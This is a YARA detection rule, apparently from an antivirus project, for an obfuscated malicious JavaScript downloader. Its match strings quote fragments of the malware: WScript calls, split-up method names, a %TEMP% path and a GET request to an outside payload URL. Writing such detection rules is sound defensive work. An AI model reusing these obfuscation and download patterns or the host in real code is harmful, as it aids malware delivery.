rule sig_20160428_80d0e2848afc218e89dbbe62854a195f {
  meta:
    description = "datamaliciousorder - file 20160428_80d0e2848afc218e89dbbe62854a195f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f24d7ed21263f571be2b1cbdc93ba12119d5266da240bc446ff2715c69a216d4"

  strings:
    $s1  = "function JliTmbMrwQpsNjsFavLsy(FrrVxnEafAuqSqmSmlGuo){AyvIleBkmPyeSfaHpvUno[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function PtgNivSbsQsjEgzYjvSfa() {return AyvIleBkmPyeSfaHpvUno[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "var AyvIleBkmPyeSfaHpvUno = function JiiIitHryJmgXyxXtyOgy() {return XylAihRalFgjRutNzgJsw[BjtUiwSbbBiqBgnIygQcj](\"WScript\"+\"" ascii
    $s4  = "return DylMkyPhtDbnUtkLmnEeu - BewLxrOtsKzxLwtNqjUpm;};" fullword ascii
    $s5  = "YziKkuBpuKupQdkIxlFwd[GghDvpOhaUbcNnsKxdFps](\"G\" + \"ET\", \"http://demo.sinelnikds.ru/b6sida\", false);" fullword ascii
    $s6  = "var XylAihRalFgjRutNzgJsw = this[\"WScript\"];" fullword ascii
    $s7  = "var AyvIleBkmPyeSfaHpvUno = function JiiIitHryJmgXyxXtyOgy() {return XylAihRalFgjRutNzgJsw[BjtUiwSbbBiqBgnIygQcj](\"WScript\"+\"" ascii
    $s8  = "function PtgNivSbsQsjEgzYjvSfa() {return AyvIleBkmPyeSfaHpvUno[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function JliTmbMrwQpsNjsFavLsy(FrrVxnEafAuqSqmSmlGuo){AyvIleBkmPyeSfaHpvUno[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s10 = "function UmmLvbXnjGteKgiDbsQgl(){return OmpGswDblToaDpwTtyJag + \"\";};" fullword ascii
    $s11 = "function HydNreEukNvdVvgTpqPsj(DylMkyPhtDbnUtkLmnEeu, BewLxrOtsKzxLwtNqjUpm){CaiHxvMvgUtrVgrXpsEho = CaiHxvMvgUtrVgrXpsEho * 1; " ascii
    $s12 = "if (YziKkuBpuKupQdkIxlFwd[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "return HydNreEukNvdVvgTpqPsj(1 == 1 ? XieNrfLjnFntEphBsjXil : 0, 1 == 1 ? UeiVhcEdhCbjFosVddSmc : 0);" fullword ascii
    $s14 = "function PpkKvhMofIesOwvTjsXbm(){return BjtUiwSbbBiqBgnIygQcj;};" fullword ascii
    $s15 = "function HydNreEukNvdVvgTpqPsj(DylMkyPhtDbnUtkLmnEeu, BewLxrOtsKzxLwtNqjUpm){CaiHxvMvgUtrVgrXpsEho = CaiHxvMvgUtrVgrXpsEho * 1; " ascii
    $s16 = "function BbqQhsPhnPiqEliWceOes(CxrHwrGyuIldDqpPbtCsg) {var LeaEahVrlGawZbqJeeMps = (1, 2, 3, 4, 5, CxrHwrGyuIldDqpPbtCsg); retur" ascii
    $s17 = "function YbqReiWsfMsoGcnSyiCku(){return 23;};" fullword ascii
    $s18 = "var BjzIdiFokHykXnyMtgWaq = false;" fullword ascii
    $s19 = "}while (AttIubTidHpjNvoRewIso);" fullword ascii
    $s20 = "var BajGwgYxpWqpNjjFfqHld = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}